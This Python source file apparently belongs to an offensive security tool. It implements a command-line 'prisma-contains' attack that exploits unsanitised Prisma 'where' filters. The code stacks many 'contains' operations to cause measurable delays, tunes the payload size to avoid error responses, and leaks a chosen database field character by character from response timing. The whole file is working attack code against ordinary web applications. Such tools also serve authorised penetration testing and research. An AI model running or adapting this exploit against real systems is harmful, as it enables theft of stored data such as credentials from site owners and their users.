import json, secrets

from requests.models import Response as Response

from plormber.utils.file import open_read
from plormber.attacks.time.base import BaseTimeORMLeakAttack
from plormber.attacks.time.exceptions import CouldNotFitParameters
from plormber.attacks.exceptions import InvalidOption

from colorama import Fore, Back, Style
from typing import Optional

class PrismaTimeBasedORMLeak(BaseTimeORMLeakAttack):
    command_name = 'prisma-contains'
    command_description = 'Time-based ORM Leak attack for Prisma with unsanitised input into a `where` option. Uses the contains operation to cause a time delay to leak the value of a field char by char.'

    trials_search_mean_tests = 5

    def __init__(self,
                 request_method: str = 'POST', request_format: str = 'json', max_leak_length: int = 256,
                 base_query_json: Optional[str] = None, base_query_file: Optional[str] = None, 
                 leak_query_json: Optional[str] = None, leak_query_file: Optional[str] = None,
                 contains_payload_json: Optional[str] = None, contains_payload_file: Optional[str] = None,
                 start_contains_length: int = 10, additional_filter_opts: dict = {}, **kwargs):
        
        super().__init__(**kwargs)
        assert base_query_file or base_query_json, f"{Fore.WHITE}{Back.RED}{Style.BRIGHT}Missing the base query{Style.RESET_ALL}"
        assert leak_query_file or leak_query_json, f"{Fore.WHITE}{Back.RED}{Style.BRIGHT}Missing the Prisma query that leaks a value for a column{Style.RESET_ALL}"
        assert contains_payload_file or contains_payload_json, f"{Fore.WHITE}{Back.RED}{Style.BRIGHT}Missing the Prisma query that uses the contains operation to cause a time delay{Style.RESET_ALL}"
        
        self.request_method = request_method
        self.request_format = request_format
        self.max_leak_length = max_leak_length
        self.base_query = base_query_json
        if base_query_file:
            self.base_query = open_read(base_query_file).decode()
        self.check_option('base query', self.base_query, '{PAYLOAD}')
        self.leak_query = leak_query_json
        if leak_query_file:
            self.leak_query = open_read(leak_query_file).decode()
        self.check_option('leak query', self.leak_query, '{ORM_LEAK}')
        self.contains_payload = contains_payload_json
        if contains_payload_file:
            self.contains_payload = open_read(contains_payload_file).decode()
        self.check_option('contains payload', self.contains_payload, '{RANDOM_STRING}')
        self.contains_len = start_contains_length
        self.additional_filter_opts = additional_filter_opts

 
    def check_option(self, option_name: str, option: str, expected_placeholder: str) -> bool:
        if expected_placeholder not in option:
            raise InvalidOption(f"InvalidOption for {option_name}: Missing {expected_placeholder} in value!")


    def trials_search(self):
        raise NotImplementedError("Needed to refactor this method")

    
    def fit_params(self):
        """
        Fits the parameters for exploiting a time-based ORM Leak
        This is mainly for finding the maximum amount of contain operations that can
        whacked into a request before getting 4xx responses.
        """
        print(f"{Style.DIM}Finding a suitable array length that wouldn't cause a 4xx response{Style.RESET_ALL}")
        diff = 1000
        while diff > 1:
            test_p = self.add_orm_leak_payload(self.build_dos_payload(), "A"*self.max_leak_length)
            r = self.send_request(test_p)
            if r.status_code != 200:
                self.contains_len -= diff
                diff = diff//2
                continue
            self.contains_len += diff

        if self.contains_len <= 0:
            raise CouldNotFitParameters("Got 4xx response on first request.")
        
        print(f"{Fore.GREEN}Fitted {Fore.CYAN}--start-contains-length {Fore.YELLOW}{Style.BRIGHT}{self.contains_len}{Style.RESET_ALL}")
    
        super().fit_params()


    def build_dos_payload(self):
        payload = {
            "OR": [
                json.loads(self.contains_payload.replace("{RANDOM_STRING}", 
                                                         secrets.token_hex(8)))
                for _i in range(self.contains_len)
            ]
        }
        return payload
    

    def add_orm_leak_payload(self, payload: dict, test_val: str, escape: bool = True):
        if escape:
            test_val = self.escape_chars(test_val)
        # The "NOT" condition is used here so when there is a char hit then there would be a slower completion time
        payload["OR"] = [
            {
                "NOT": json.loads(
                    self.leak_query.replace("{ORM_LEAK}", test_val)
                )
            }
        ] + payload["OR"]
        return self.prepare_payload(payload)


    def escape_chars(self, to_escape: str) -> str:
        # Escape wildcard chars
        to_escape = to_escape.replace('%', '\\%')
        to_escape = to_escape.replace('_', '\\_')
        # Slicing to remove the ""
        return json.dumps(to_escape)[1:-1]


    def prepare_payload(self, p: dict) -> dict:
        if self.request_format == 'json':
            return json.loads(self.base_query.replace("{PAYLOAD}", json.dumps(p)))
        raise NotImplementedError("Have not implemented other formats yet")


    def send_request(self, payload: list | str | dict) -> Response:
        if self.request_format == 'json':
            return self.request(self.request_method, self.target, json=payload)
        raise NotImplementedError("Have not implemented other formats yet")


    @classmethod
    def add_options(cls, parser):
        parser = super().add_options(parser)

        parser.add_argument(
            '-m', '--request-method',
            help='The method to set for the request',
            default='POST',
            type=str
        )

        parser.add_argument(
            '-f', '--request-format',
            help='Format of the request',
            default='json',
            choices=['json']
        )

        parser.add_argument(
            '--max-leak-length',
            help='Max number of characters to leak',
            default=256,
            type=int
        )

        parser.add_argument(
            '--base-query-json',
            help='The base query in JSON format. Put "{PAYLOAD}" for where the payload should be inserted.',
            type=str
        )

        parser.add_argument(
            '--base-query-file',
            help='File path to the base query in JSON format. Put "{PAYLOAD}" for where the payload should be inserted.',
            type=str
        )

        parser.add_argument(
            '--leak-query-json',
            help='The prisma query in JSON format to execute that uses the "startsWith" operation to leak out a value char by char. Put "{ORM_LEAK}" in the position where you want test strings to be inserted.',
            type=str
        )

        parser.add_argument(
            '--leak-query-file',
            help='File path to the prisma query in JSON format to execute that uses the "startsWith" operation to leak out a value char by char. Put "{ORM_LEAK}" in the position where you want test strings to be inserted.'
        )

        parser.add_argument(
            '--start-contains-length',
            help='The starting length of the array with the contains operations to cause a delay on the next character is leaked.',
            default=10,
            type=int
        )

        parser.add_argument(
            '--contains-payload-json',
            help='The prisma query in JSON format that uses the "contains" operation to cause a time delay. Put "{RANDOM_STRING}" where random strings should be inserted.'
        )

        parser.add_argument(
            '--contains-payload-file',
            help='File path to the prisma query in JSON format that uses the "contains" operation to cause a time delay. Put "{RANDOM_STRING}" where random strings should be inserted.'
        )

        parser.add_argument(
            '--additional-filter-opts',
            help='additional filter options to dump exactly what you want as a JSON string (e.g. {"email":{"contains":"admin"}})',
            default={},
            type=json.loads
        )

        return parser
